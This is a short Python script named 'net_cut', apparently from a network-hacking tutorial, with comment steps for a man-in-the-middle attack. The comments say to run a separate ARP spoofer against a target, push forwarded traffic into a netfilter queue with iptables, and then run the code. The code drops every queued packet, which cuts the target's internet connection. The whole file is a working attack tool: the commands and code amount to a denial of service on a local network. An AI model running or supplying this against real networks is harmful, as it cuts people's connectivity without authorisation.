# 1-to make net_cut work, you must first run the arp_spoofer,
#  make sure to read instruction in .py file

# 2-in terminal run >> sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
# then run this program

# 3-to finish clear the iptables created by the terminal command iptables 
# >> sudo iptables --flush

# 4-to run this program on your local computer the iptables cmd must be modified.
# You must execute the next 2 following cmds:
# >> sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
# >> sudo iptables -I INPUT -j NFQUEUE --queue-num 0
# then you will be able to run this program against your own computer

# install sudo apt install python3-netfilterqueue
import netfilterqueue

def process_packet(packet):
    print(packet)
    packet.drop()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
